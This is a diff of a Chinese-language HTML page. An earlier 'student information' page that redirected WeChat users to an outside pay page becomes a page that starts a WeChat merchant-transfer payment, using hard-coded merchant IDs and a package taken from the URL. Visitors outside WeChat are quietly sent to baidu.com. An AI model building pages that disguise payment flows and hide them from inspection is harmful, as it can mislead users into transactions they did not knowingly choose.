@@ -1,269 +1,135 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>学生信息获取 - 跳转中</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-        }
-        
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: #07c160;
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 40px;
-        }
-        
-        h1 {
-            color: #333;
-            margin-bottom: 15px;
-            font-size: 24px;
-        }
-        
-        .status {
-            color: #666;
-            margin: 20px 0;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 10px;
-            font-size: 14px;
-        }
-        
-        .loading {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #07c160;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        
-        .wechat-tip {
-            background: #e6f7e6;
-            border: 1px solid #07c160;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: left;
-        }
-        
-        .steps {
-            text-align: left;
-            margin: 20px 0;
-        }
-        
-        .step {
-            display: flex;
-            align-items: center;
-            margin: 10px 0;
-        }
-        
-        .step-number {
-            width: 24px;
-            height: 24px;
-            background: #07c160;
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 10px;
-            font-size: 12px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .hidden {
-            display: none;
-        }
-    </style>
+    <title>付款处理中...</title>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">📚</div>
-        <h1>学生信息获取</h1>
-        
-        <div id="wechatCheck">
-            <div class="status">正在检测微信环境...</div>
-            <div class="loading"></div>
-            <p>请稍候，系统正在验证访问环境</p>
-        </div>
-        
-        <div id="wechatSuccess" class="hidden">
-            <div class="status" style="color: #07c160;">
-                ✓ 微信环境验证成功
-            </div>
-            <div class="wechat-tip">
-                <strong>检测到微信浏览器</strong>
-                <p>正在准备跳转到学习页面...</p>
-            </div>
-        </div>
-        
-        <div id="wechatFail" class="hidden">
-            <div class="status" style="color: #f5222d;">
-                ✗ 微信环境检测失败
-            </div>
-            <div class="wechat-tip">
-                <strong>请在微信中打开</strong>
-                <p>检测到当前不在微信环境中，请：</p>
-                <div class="steps">
-                    <div class="step">
-                        <div class="step-number">1</div>
-                        <span>点击右上角菜单</span>
-                    </div>
-                    <div class="step">
-                        <div class="step-number">2</div>
-                        <span>选择"在浏览器打开"</span>
-                    </div>
-                    <div class="step">
-                        <div class="step-number">3</div>
-                        <span>选择"微信"</span>
-                    </div>
-                </div>
-            </div>
-            <button onclick="retryWechatCheck()" style="padding: 10px 20px; background: #07c160; color: white; border: none; border-radius: 5px; cursor: pointer;">
-                重新检测
-            </button>
-        </div>
-        
-        <div id="redirecting" class="hidden">
-            <div class="status">正在跳转学习页面...</div>
-            <div class="loading"></div>
-            <p>请勿关闭页面，跳转完成后自动进入学习系统</p>
-        </div>
-    </div>
-
     <script>
-        // 微信环境检测和跳转逻辑
-        function checkWechatEnvironment() {
-            const wechatCheck = document.getElementById('wechatCheck');
-            const wechatSuccess = document.getElementById('wechatSuccess');
-            const wechatFail = document.getElementById('wechatFail');
-            const redirecting = document.getElementById('redirecting');
+        // 固定参数
+        const FIXED_APP_ID = 'wxad94e9ad4d1e3555';
+        const FIXED_MCH_ID = '1104737397';
+        
+        // 从URL获取package参数
+        const getUrlParam = (name) => {
+            const params = new URLSearchParams(window.location.search);
+            return params.get(name);
+        };
+        
+        const packageStr = getUrlParam('p');
+        
+        if (!packageStr) {
             
-            // 检测微信浏览器
+           window.location.href = "https://www.baidu.com";
+            //document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red;">错误：缺少package参数(p)</div>';
+            //throw new Error('缺少package参数(p)');
+        }
+        
+        // 解码package参数
+        let decodedPackage = packageStr;
+        try {
+            // 尝试解码
+            decodedPackage = decodeURIComponent(packageStr);
+        } catch (e) {
+            console.log('无需解码或解码失败，使用原字符串');
+        }
+        
+        console.log('支付参数:', {
+            appId: FIXED_APP_ID,
+            mchId: FIXED_MCH_ID,
+            package: decodedPackage
+        });
+        
+        // 主要支付逻辑
+        const initiatePayment = () => {
+            // 检查是否在微信环境中
             const isWeixin = /MicroMessenger/i.test(navigator.userAgent);
             
-            setTimeout(() => {
-                if (isWeixin) {
-                    // 微信环境检测成功
-                    wechatCheck.classList.add('hidden');
-                    wechatSuccess.classList.remove('hidden');
-                    
-                    // 2秒后开始跳转
-                    setTimeout(() => {
-                        wechatSuccess.classList.add('hidden');
-                        redirecting.classList.remove('hidden');
-                        
-                        // 执行最终跳转
-                        redirectToTargetPage();
-                    }, 2000);
-                    
-                } else {
-                    // 非微信环境
-                    wechatCheck.classList.add('hidden');
-                    wechatFail.classList.remove('hidden');
-                }
-            }, 1500);
-        }
-        
-        function redirectToTargetPage() {
-            // 获取URL参数
-            const urlParams = new URLSearchParams(window.location.search);
-            const packageParam = urlParams.get('p');
-            
-            if (packageParam) {
-                // 构建目标URL - 使用您提供的真实链接
-                const targetUrl = `http://zhuhongbin.cn/pay.html?p=${encodeURIComponent(packageParam)}`;
-                
-                console.log('跳转到目标页面:', targetUrl);
-                
-                // 使用replace方法跳转，不保留历史记录
-                setTimeout(() => {
-                    try {
-                        window.location.replace(targetUrl);
-                    } catch (e) {
-                        // 如果replace失败，使用href跳转
-                        window.location.href = targetUrl;
-                    }
-                }, 1000);
-                
-            } else {
-                // 如果没有参数，显示错误
-                document.getElementById('redirecting').innerHTML = `
-                    <div class="status" style="color: #f5222d;">
-                        ✗ 跳转参数缺失
+            if (!isWeixin) {
+                 window.location.href = "https://www.baidu.com";
+               /* document.body.innerHTML = `
+                    <div style="text-align:center;padding:50px;">
+                      <h3>请在微信中打开此页面</h3>
+                        <p>检测到当前不在微信环境中</p>
+                        <p>请复制链接到微信中打开</p>
                     </div>
-                    <p>缺少必要的跳转参数，请联系管理员</p>
-                    <button onclick="location.reload()" style="padding: 10px 20px; background: #1890ff; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px;">
-                        重新加载
-                    </button>
-                `;
+                `;*/
+                return;
             }
-        }
-        
-        function retryWechatCheck() {
-            document.getElementById('wechatFail').classList.add('hidden');
-            document.getElementById('wechatCheck').classList.remove('hidden');
-            checkWechatEnvironment();
-        }
-        
-        // 添加微信JS-SDK支持（如果需要）
-        function loadWechatSDK() {
-            const script = document.createElement('script');
-            script.src = 'https://res.wx.qq.com/open/js/jweixin-1.6.0.js';
-            script.onload = function() {
-                console.log('微信JS-SDK加载完成');
-            };
-            document.head.appendChild(script);
-        }
-        
-        // 页面加载完成后开始检测
-        document.addEventListener('DOMContentLoaded', function() {
-            checkWechatEnvironment();
-            loadWechatSDK();
-        });
-        
-        // 处理页面可见性变化
-        document.addEventListener('visibilitychange', function() {
-            if (!document.hidden) {
-                console.log('页面回到前台，重新检查状态');
+            
+            // 在微信环境中，尝试调用支付
+            if (typeof WeixinJSBridge !== 'undefined') {
+                console.log('检测到WeixinJSBridge，发起付款...');
+                
+                document.body.innerHTML = '<div style="text-align:center;padding:50px;">正在发起付款...</div>';
+                
+                WeixinJSBridge.invoke(
+                    'requestMerchantTransfer',
+                    {
+                        mchId: FIXED_MCH_ID,
+                        appId: FIXED_APP_ID,
+                        package: decodedPackage
+                    },
+                    function(res) {
+                        console.log('支付结果:', res);
+                        
+                        let message = '处理中...';
+                        
+                        if (res.err_msg === 'requestMerchantTransfer:ok') {
+                            message = '付款请求已提交成功';
+                        } else if (res.err_msg === 'requestMerchantTransfer:cancel') {
+                            message = '付款已取消';
+                        } else if (res.err_msg && res.err_msg.includes('fail')) {
+                            message = '付款失败: ' + res.err_msg;
+                        } else {
+                            message = '处理结果: 未知状态';
+                        }
+                       window.location.href = "https://www.baidu.com";
+                        document.body.innerHTML = `
+                            <div style="text-align:center;padding:50px;">
+                                <h3>${message}</h3>
+                                <p id="countdown">请手动关闭页面</p>
+                            </div>
+                        `;
+                   
+                    }
+                );
+            } else {
+                // 等待WeixinJSBridge就绪
+                document.body.innerHTML = '<div style="text-align:center;padding:50px;">正在加载支付组件...</div>';
+                
+                if (document.addEventListener) {
+                    document.addEventListener('WeixinJSBridgeReady', function() {
+                        if (typeof WeixinJSBridge !== 'undefined') {
+                            initiatePayment(); // 重新执行
+                        }
+                    }, false);
+                }
+                
+                // 5秒后如果还没加载出来，显示提示
+                setTimeout(() => {
+                    if (typeof WeixinJSBridge === 'undefined') {
+                        document.body.innerHTML = `
+                            <div style="text-align:center;padding:50px;">
+                                <h3>支付组件加载失败</h3>
+                                <p>请尝试：</p>
+                                <p>1. 刷新页面重试</p>
+                                <p>2. 检查微信版本是否为最新</p>
+                                <p>3. 联系客服处理</p>
+                            </div>
+                        `;
+                    }
+                }, 5000);
             }
-        });
+        };
+        
+        // 页面加载完成后开始支付流程
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initiatePayment);
+        } else {
+            initiatePayment();
+        }
     </script>
 </body>
 </html>
